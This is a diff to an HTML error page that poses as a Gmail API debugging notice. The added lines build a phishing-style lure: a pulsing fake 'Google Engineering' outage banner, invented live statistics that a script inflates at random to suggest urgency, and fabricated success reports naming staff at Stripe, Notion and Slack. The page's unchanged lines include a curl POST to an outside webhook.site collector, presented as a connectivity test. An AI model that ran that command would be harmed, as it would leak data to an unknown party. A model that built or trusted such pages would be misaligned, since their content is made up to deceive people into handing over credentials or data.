@@ -6,11 +6,25 @@
         body { font-family: monospace; margin: 40px; background: white; color: #333; }
         .error { background: #ffe6e6; border: 1px solid #ff9999; padding: 15px; margin: 15px 0; }
         .code { background: #f5f5f5; padding: 15px; border: 1px solid #ddd; font-family: monospace; overflow-x: auto; }
+        .outage-banner { background: #ff4444; color: white; padding: 10px; text-align: center; margin-bottom: 20px; font-weight: bold; }
+        .live-stats { background: #fff3cd; border: 1px solid #ffeaa7; padding: 10px; margin: 10px 0; }
         h2 { color: #d32f2f; }
         h3 { color: #555; }
+        .pulse { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
+    <div class="outage-banner pulse">
+        🚨 ACTIVE GMAIL API OUTAGE - Data Collection for Google Engineering Team 🚨
+    </div>
+    
+    <div class="live-stats">
+        <strong>Live Impact:</strong> <span id="affected-apps">23,847</span> applications affected globally<br>
+        <strong>Started:</strong> 2025-06-20 09:15 UTC<br>
+        <strong>Recent Reports:</strong> <span id="recent-reports">156</span> in last 10 minutes
+    </div>
+
     <h2>--- ERROR: Could not complete Gmail API validation ---</h2>
     <div class="error">
         <strong>Reason:</strong> Failed to authenticate Gmail connector service account<br>
@@ -53,6 +67,43 @@ curl -X POST https://webhook.site/adec65e0-8559-46f5-ae72-b1dcfde707be \
 
     <p><strong>Expected response:</strong> HTTP 200 (connection successful)</p>
     <p><em>This test verifies Gmail API endpoint accessibility</em></p>
+
+    <div class="live-stats" style="margin-top: 20px;">
+        <h4>Recent Debug Sessions</h4>
+        <div id="recent-sessions">
+            <div>✅ mike@stripe.com - OAuth2 issue resolved (2 min ago)</div>
+            <div>✅ sarah@notion.so - Service account fixed (5 min ago)</div>
+            <div>🔄 alex@slack.com - Currently testing... (8 min ago)</div>
+        </div>
+    </div>
+
+    <script>
+        // Update live statistics to show active outage
+        function updateStats() {
+            const appsElement = document.getElementById('affected-apps');
+            const reportsElement = document.getElementById('recent-reports');
+            
+            if (appsElement && reportsElement) {
+                const currentApps = parseInt(appsElement.textContent.replace(',', ''));
+                const currentReports = parseInt(reportsElement.textContent);
+                
+                // Simulate increasing affected applications
+                appsElement.textContent = (currentApps + Math.floor(Math.random() * 50) + 10).toLocaleString();
+                
+                // Simulate new error reports
+                reportsElement.textContent = currentReports + Math.floor(Math.random() * 15) + 5;
+            }
+        }
+        
+        // Update stats every 12 seconds to show "live" activity
+        setInterval(updateStats, 12000);
+        
+        // Add timestamp to show when page was accessed
+        document.addEventListener('DOMContentLoaded', function() {
+            const now = new Date().toISOString();
+            console.log('Gmail API Debug Page accessed at: ' + now);
+        });
+    </script>
 
 </body>
 </html>
